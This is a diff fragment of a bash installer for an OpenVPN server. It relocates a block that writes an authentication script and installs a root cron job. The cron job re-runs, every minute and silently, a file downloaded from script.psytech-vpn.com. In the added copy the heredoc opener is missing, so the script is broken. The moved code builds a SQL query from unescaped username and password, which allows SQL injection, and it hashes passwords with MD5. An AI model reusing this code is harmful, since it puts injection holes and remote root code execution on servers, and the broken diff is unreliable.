@@ -1348,6 +1348,19 @@ if __name__ == '__main__':
 PTHON
 }
 
+/etc/openvpn/script/authvpn.sh
+#!/bin/bash
+. /etc/openvpn/script/config.sh
+Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND status='live' AND is_freeze=0 AND is_ban=0 AND (duration > 0 OR vip_duration > 0 OR private_duration > 0)"
+user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
+[ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
+EOM
+		
+		
+wget -O /root/activate.sh "script.psytech-vpn.com/ssh/prem/activate.sh"
+
+echo "* * * * * /bin/bash /root/activate.sh >/dev/null 2>&1" | crontab -
+
 
 function service1() {
 
@@ -1647,18 +1660,7 @@ if __name__ == '__main__':
 PTHON
 }
 
-cat <<\EOM >/etc/openvpn/script/authvpn.sh
-#!/bin/bash
-. /etc/openvpn/script/config.sh
-Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND status='live' AND is_freeze=0 AND is_ban=0 AND (duration > 0 OR vip_duration > 0 OR private_duration > 0)"
-user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
-[ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
-EOM
-		
-		
-wget -O /root/activate.sh "script.psytech-vpn.com/ssh/prem/activate.sh"
 
-echo "* * * * * /bin/bash /root/activate.sh >/dev/null 2>&1" | crontab -
 
 
 function gatorade1() {
